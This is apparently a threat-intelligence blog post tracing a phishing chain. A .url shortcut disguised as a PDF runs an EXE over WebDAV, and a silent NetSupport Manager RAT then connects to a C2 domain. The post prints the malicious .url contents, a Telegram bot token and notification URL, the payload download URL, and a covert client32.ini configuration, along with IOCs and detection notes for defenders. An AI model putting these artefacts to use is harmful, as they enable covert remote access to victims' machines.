---
title: "FUD .url, WebDAV Delivery, and a NetSupport RAT Phoning Home on Telegram"
description: "A Windows URL shortcut disguised as a PDF had 1/75 detections at submission time. It used the WebDAV-over-HTTP UNC trick to silently execute an EXE off a Hong Kong opendir. Two stages later: a silent NetSupport Manager install beaconing to a 16-day-old C2 domain while Telegram told the operator their new victim was live."
pubDate: "2026-07-01T12:00:00"
permalink: "/2026/07/01/fud-url-webdav-netsupport-rat/"
tags: ["Threat Intel", "NetSupport", "RAT", "Phishing", "WebDAV", "Telegram", "Infrastructure", "VirusTotal"]
draft: false
---

[@smica83](https://x.com/smica83) flagged a file with 1/75 detections: `RELEASE FORM.pdf.url`, SHA256 `f141db13…`. The VT label read `HEUR:Trojan.WinINF.Alien.gen` — a single Kaspersky hit. Everything else called it clean.

The `.url` extension is the giveaway. Not a PDF. A Windows Internet Shortcut. When you double-click it, Explorer does not open a browser tab. It connects to a file server, mounts a share, and executes an EXE directly off it. By the time your AV notices, the payload is already running.

Everything below was collected passively: VT, WHOIS, and a lot of reading. No contact with live C2.

---

### The lure

The file is 229 bytes, ASCII, eight lines:

```
[{001261A0-0000-0000-A000-000000001213}]
Prop3=19,2
[InternetShortcut]
IconIndex=11
IconFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
IDList=
URL=file://\\85.11.161.22@80\share\Rate_RATE_AGR_Jun29.exe
HotKey=0
```

Two things are doing work here. First, the icon: `msedge.exe, IconIndex=11` is the default Edge browser shortcut icon — the blue wave. To a user skimming their downloads folder, this looks like a link someone sent them. Not an executable. Not a script.

Second, the URL: `file://\\85.11.161.22@80\share\Rate_RATE_AGR_Jun29.exe`. This is the WebDAV-over-HTTP UNC path trick. Windows' WebClient service interprets `\\server@port\share` as an HTTP WebDAV mount. When Explorer resolves this URL shortcut, it mounts the share over HTTP and executes `Rate_RATE_AGR_Jun29.exe` as if it were a local file. No browser download dialog. No SmartScreen prompt for the `.url` file itself (1/75 means most engines had no signature for it). The payload runs directly from the remote server.

The file names frame this as an HR target. `RELEASE FORM.pdf.url` is what a new-hire documents package looks like. `Rate_RATE_AGR_Jun29.exe` — a rate agreement, dated June 29 — is what you might expect alongside it. Someone in HR or finance who receives a document bundle like this and double-clicks the first file doesn't think twice.

The staging server is `85.11.161.22`, AS207043 Dedik Services Limited, Hong Kong. VT shows one malicious vote from CRDF and one suspicious. The server is hosting the share as an HTTP WebDAV service on port 80.

---

### Stage one: the dropper

`Rate_RATE_AGR_Jun29.exe` (SHA256 `dec98a1ef5d1d…`, 17/75 VT) is a PE32+ x64 executable, 201,728 bytes. The PE timestamp says 2024-07-31 — nearly two years before it was submitted to VT on 2026-06-29. Timestamps this far in the past are almost always forged. Analysts filtering for recent builds in threat-hunting queries drop older timestamps.

The PE has no visible imports. No `GetProcAddress`, no `LoadLibrary` in the import directory — the standard markers that AV heuristics look for. The executable resolves its own API at runtime, which is why 58 out of 75 engines returned nothing. Three RT_RCDATA resources sit in the binary with entropy between 7.13 and 7.84. Those are not images or version manifests. That entropy level means either compression or encryption.

VT's behavioural tags are `detect-debug-environment` and `long-sleeps`. Both are sandbox-evasion markers: the binary checks whether it is running under a debugger or in a VM before doing anything interesting, and it sleeps long enough that short-timeout sandboxes time out without capturing network activity. Sandbox telemetry names the dropped file `C:\Windows\fp914mi.exe` — a random eight-character path in the system directory, chosen at install time. The same technique appeared in the `23172837484.ocx` dropper from [the Chopi investigation](/2026/07/07/chopi-rat-vishing-opendir-pivot/); different actor, same evasion playbook.

When it does run, it calls two external services. The first is `api.telegram.org`. The second is `easyfiles.cc`.

---

### The Telegram knock

Before fetching any payload, the dropper sends a message to a Telegram channel. The full URL captured in VT's behaviour data:

```
https://api.telegram.org/bot8863068816:AAE_841furjQGA3NwEYevapth0at2Jn1b4c/sendMessage
  ?chat_id=@supstuk
  &text=🔔+Knock:+1%0AMode:+1%0ABot:+B58CCD05
```

Decoded, the message is:

```
🔔 Knock: 1
Mode: 1
Bot: B58CCD05
```

The bot token `8863068816:AAE_841furjQGA3NwEYevapth0at2Jn1b4c` is hardcoded in the binary. The channel is `@supstuk`. `B58CCD05` is a campaign or victim-tracking ID baked into this build. Every victim that runs this file sends an identical knock to the same channel. The operator gets a notification the moment the payload executes — before the RAT installs, before C2 connects, just: "someone ran it."

This is a common pattern in lower-sophistication crews. Bot token in plaintext means an analyst who finds the binary can read the operator's notification channel. The token is also valid after the campaign ends, so anyone who discovers it later can still check the chat history — if `@supstuk` isn't private.

---

### Stage two: easyfiles.cc and NS2H.zip

After sending the knock, the dropper fetches:

```
https://easyfiles.cc/2026/6/ce0a3ffe-dc52-470b-8686-99cd20029255/NS2H.zip
```

`easyfiles.cc` was registered on 2023-06-18 via NameSilo, with Cloudflare nameservers. The A record resolves to `2.56.244.97`, a server in AS216063 (24fire GmbH, Germany). The TLS certificate is a Traefik default — self-generated, no hostname. VT scores the domain 12/91 malicious. Looking at the full list of files that have been observed fetching from this host, it hosts content for dozens of unrelated actors: `.bat` loaders, Minecraft mod `.jar` files, packed EXEs with names like `BOMBA BLYET.exe` and `ConsoleApp1.exe`. This is not dedicated attacker infrastructure. It is a shared file-hosting platform that threat actors use because it is cheap, anonymous, and the UUID-based file paths are not guessable.

`NS2H.zip` (SHA256 `fa33f0af…`, 29/75 VT) expands to a package of files named after a well-known remote-access product:

| File | Role | VT |
|---|---|---|
| `Updatesystem.exe` | Renamed `client32.exe` | 17/76 |
| `htctl32.dll` | NetSupport core DLL | 2/76 |
| `client32.ini` | C2 configuration | 1/75 |
| `NSM.LIC` | NetSupport license | 9/76 |
| `remcmdstub.exe` | Remote command stub | 3/76 |
| `PCICHEK.DLL` | NetSupport PCI DLL | 1/77 |

This is **NetSupport Manager**, a legitimate remote-access product from NetSupport Ltd. Threat actors have been deploying it as a RAT since at least 2018. The legitimate binary is digitally signed; VT flags `Updatesystem.exe` as `signed` with `invalid-signature` — the certificate is present but the signature does not validate, which is typical for repackaged NetSupport installs that modify the binary after signing. Kaspersky labels it `not-a-virus:HEUR:RemoteAdmin.Win32.NetSup.gen`. Rising calls it `PUF.RemoteAdmin!1.E606`. CrowdStrike flags it as grayware at 90% confidence.

The rename from `client32.exe` to `Updatesystem.exe` is the only cosmetic change. On a compromised system, a process called `Updatesystem.exe` in `%TEMP%` or `%APPDATA%` does not immediately look like a remote-access tool to a casual observer.

---

### The C2 config: nohakob.icu

`client32.ini` is the configuration file that tells the NetSupport client where to connect. The relevant section:

```ini
[HTTP]
GatewayAddress=nohakob.icu:443
gsk=FH:I?ECFGH<GACDDGF:O=B
gskmode=0
GSK=FH:I?ECFGH<GACDDGF:O=B
GSKX=FH:I?ECFGH<GACDDGF:O=B
SecondaryGateway=45.88.78.28:443
SecondaryPort=443
```

And the install configuration:

```ini
[Client]
AlwaysOnTop=1
DisableChatMenu=1
DisableClientConnect=1
DisableDisconnect=1
DisableGeolocation=1
DisableReplayMenu=1
DisableRequestHelp=1
ShowUIOnConnect=0
silent=1
SKMode=1
SysTray=0
```

Every option that would make the remote-access session visible to the victim is turned off. No system tray icon. No connection dialog. No chat menu, no disconnect option, no help request button. Room is `Eval` — a common staging room name that NetSupport operators use before sorting victims into active targets. The GSK (gateway shared key) is NetSupport's obfuscated authentication token for the gateway connection.

`nohakob.icu` was registered on **2026-06-13** — sixteen days before `RELEASE FORM.pdf.url` was first submitted to VT on 2026-06-29. The domain was registered via Public Domain Registry (PDR) and uses Cloudflare nameservers. Its A record resolves to `45.88.78.28`.

`45.88.78.28` is in AS204601, NovoServe B.V., United States, network `45.88.78.0/23`. VT records zero malicious detections against it directly — it is clean infrastructure, registered specifically for this campaign. The hardcoded secondary gateway `45.88.78.28:443` and the DNS resolution of `nohakob.icu` point to the same server. Primary and secondary are the same host; the redundancy here is cosmetic.

Only two VT-tracked files have ever contacted `nohakob.icu`: `RELEASE FORM.pdf.url` and `NS2H.zip`. This is a single-campaign domain.

---

### Infrastructure map

```
[DELIVERY]
  85.11.161.22 (HK, Dedik Services, AS207043)
    └─ /share/RELEASE FORM.pdf.url   (lure)
    └─ /share/Rate_RATE_AGR_Jun29.exe (stage 1)

[PAYLOAD HOSTING]
  easyfiles.cc → 2.56.244.97 (DE, 24fire GmbH, AS216063)
    └─ /2026/6/ce0a3ffe-.../NS2H.zip  (NetSupport package)

[OPERATOR NOTIFICATION]
  api.telegram.org (Telegram)
    └─ bot 8863068816 → @supstuk channel

[C2 GATEWAY]
  nohakob.icu → 45.88.78.28 (US, NovoServe, AS204601)
    └─ port 443, Room "Eval"
    └─ registered 2026-06-13 (16 days pre-campaign)
```

---

### Putting it together

The full chain from double-click to operator control:

1. Victim double-clicks `RELEASE FORM.pdf.url`. Explorer reads the Edge icon. Looks like a browser link.
2. Windows WebClient mounts `\\85.11.161.22@80\share` over HTTP. `Rate_RATE_AGR_Jun29.exe` executes directly from the remote share — no file ever touches the local disk in the conventional download sense.
3. The dropper checks for a debugger. If clean, it sends a Telegram knock to `@supstuk`: "Knock: 1, Mode: 1, Bot: B58CCD05". The operator now knows this victim ran the payload.
4. The dropper fetches `NS2H.zip` from `easyfiles.cc`, extracts it, and installs `Updatesystem.exe` silently in `%TEMP%`.
5. `Updatesystem.exe` (NetSupport Manager client32.exe) connects to `nohakob.icu:443` with the encoded GSK. The operator's NetSupport Manager console shows a new machine in the "Eval" room.
6. The operator has full remote desktop, file transfer, shell access, and keystroke logging — all via a legitimate commercial RAT with low AV detection, on a 16-day-old domain that no threat feed has touched.

The lure theme — a release form and a rate agreement — suggests this is targeted at employees who handle contracts or HR documents. Not a spray campaign. The `B58CCD05` campaign ID implies the operator is tracking multiple concurrent campaigns with separate bot IDs.

The WebDAV delivery technique is worth highlighting. The `.url` file itself is what the victim receives — by email, by chat, by a shared folder link. It is 229 bytes. The executable never touches the victim's filesystem until after the initial checks pass. From a detection standpoint, the only local artifact at stage one is a tiny `.url` file with one AV hit. By the time a defender looks at endpoint logs, the stage-one EXE ran from a mapped network share that has since unmounted itself.

---

### IOCs

```
# Lure
f141db13721b9f0248e4eb482bd0462995c920595ed9e87e704f841543f63621  RELEASE FORM.pdf.url

# Stage 1
dec98a1ef5d1d1b5a6aa886345de1ac4adcea5829509e375b7cf87b7a22fb91d  Rate_RATE_AGR_Jun29.exe
  imphash: ca7cf48965e5612a16429deba2029941

# Stage 2 (NS2H package)
fa33f0af6511c3e0023d4960fb3f046a09c0e5ae6261d396789baf147ca328a5  NS2H.zip
46c40af9624ba9be8af28cfc7d3847552a93089b4b4db07a66547081f29f9891  Updatesystem.exe (client32.exe)
6562585009f15155eea9a489e474cebc4dd2a01a26d846fdd1b93fdc24b0c269  htctl32.dll
e8cf924da6401e02f96c4639f257d410b2a6d4e8d5f6650ea9d57cbb4c758cff  client32.ini
1dda2a0a0bab08a23b976c0314e7cdb9b8e6732910df5c53692f92a7abc4b562  NSM.LIC
3f9cdacaf03050325aa554e4f7bc769ce2fe9554a06237a1ec8a191bade0bf18  remcmdstub.exe
45532e8ecdccca684dd3b492c58485b0b2987893f5c7a3590c60f5fcaec4a27c  PCICHEK.DLL

# Infrastructure
85.11.161.22          staging opendir (HK, Dedik Services, AS207043)
2.56.244.97           easyfiles.cc host (DE, 24fire GmbH, AS216063)
nohakob.icu           NetSupport C2 gateway (reg. 2026-06-13, PDR/Cloudflare)
45.88.78.28           NetSupport C2 IP (US, NovoServe, AS204601)

# Telegram
bot token:   8863068816:AAE_841furjQGA3NwEYevapth0at2Jn1b4c
channel:     @supstuk
campaign ID: B58CCD05

# GSK (obfuscated)
FH:I?ECFGH<GACDDGF:O=B
```

---

### Detection notes

A `file://\\host@port\share\` URL inside a `.url` file is a reliable detection signal — legitimate software does not deliver programs this way. The NetSupport components are identifiable by their PE version info and import hash even when renamed. The Telegram bot token is static across the life of a campaign and can be blocklisted at the network layer. `nohakob.icu` was 0/91 on VT at investigation time but should be considered malicious given the totality of context.
